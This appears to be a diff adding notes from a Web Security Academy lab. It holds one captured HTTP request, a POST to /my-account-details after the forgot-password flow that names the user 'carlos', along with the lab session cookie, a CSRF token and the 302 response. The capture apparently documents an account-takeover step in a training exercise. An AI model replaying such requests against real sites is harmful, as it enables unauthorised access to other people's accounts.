@@ -1,0 +1,37 @@
+II
+
+A 
+
+POST /my-account-details HTTP/2
+Host: 0a0b0036034d6688801803a000ed009d.web-security-academy.net
+Cookie: session=J7UP9Aq5sDWuRtxzFr46HUprjBL16Bgp; _lab=46%7cMCwCFHc%2bIcED2Devkwv8bvMBV2KH5HcoAhQWZR%2fueyaslHS9FR%2b7h7jcibL6EW78jVOZJTWCH7bvHjLGk1Uvz%2bc8ajOSjOA%2bd%2bl4TMPm1Hsn%2b%2f7pwKzGoCxCLVe9MGubBPFVLvx4JX0jXh0TVi78K4%2bqMePXbyP3oUEkMx%2b8RyRkvUI%3d
+Content-Length: 53
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Origin: https://0a0b0036034d6688801803a000ed009d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a0b0036034d6688801803a000ed009d.web-security-academy.net/forgot-password
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+csrf=BHLO66SdGxYt4D6h4d3z9cyn8Zfn31Xb&username=carlos
+
+
+
+HTTP/2 302 Found
+Location: /hello
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+
+  
